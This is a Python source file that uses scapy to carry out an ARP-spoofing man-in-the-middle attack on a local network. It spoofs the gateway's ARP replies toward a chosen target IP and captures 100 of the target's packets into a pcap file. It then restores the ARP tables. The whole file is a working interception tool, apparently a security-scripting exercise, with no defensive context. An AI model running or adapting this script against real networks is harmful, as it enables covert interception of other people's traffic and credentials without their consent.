import os
import sys
import time
from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)



class Arper:
    def __init__(self, target_ip, gateway, interface) -> None:
        self.target_ip = target_ip
        self.gateway = gateway
        self.interface = interface
        self.target_mac = self.get_mac(self.target_ip)
        self.gateway_mac = self.get_mac(self.gateway)

        print(f'Initialized {interface}:')
        print(f'Gateway ({self.gateway} is at {self.gateway_mac}).')
        print(f'Target ({self.target_ip} is at {self.target_mac}).')
        print('-'*30)


    # 通过ARP广播查询目标ip的MAC地址
    def get_mac(self, target_ip):
        packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=target_ip)
        ans, _ = srp(packet, timeout=2, retry=10, verbose=False, iface=self.interface)
        for _, r in ans.res: #_为query，r为answer
            print(r[Ether].src)
            return r[Ether].src
        return None


    def run(self):
        self.poison_process =Process(target=self.poison)
        self.sniff_process = Process(target=self.sniff)

        self.poison_process.start()
        self.sniff_process.start()

        self.poison_process.join()
        self.sniff_process.join()


    def poison(self):
        packet = ARP(op=2, psrc=self.gateway, pdst=self.target_ip, hwdst=self.target_mac)
        print(packet)
        print('-'*30)

        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(packet, iface=self.interface)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self):
        time.sleep(5)
        print("Sniffing packets")
        bpf_filter = "ip host %s" % self.target_ip
        packets = sniff(count=100, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print("Got the packets")
        self.restore()
        self.poison_process.terminate()
        print("Finished")

    def restore(self):
        print("Restoring ARP tables...")
        send(ARP(op=2, psrc=self.gateway, hwsrc=self.gateway_mac, pdst=self.target_ip, hwdst='ff:ff:ff:ff:ff:ff'))


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print('Usage: python kgarp.py [target_ip] [gateway] [interface]')
        sys.exit()
    target_ip = sys.argv[1]
    gateway = sys.argv[2]
    interface = sys.argv[3]
    arper = Arper(target_ip, gateway, interface)
    arper.run()
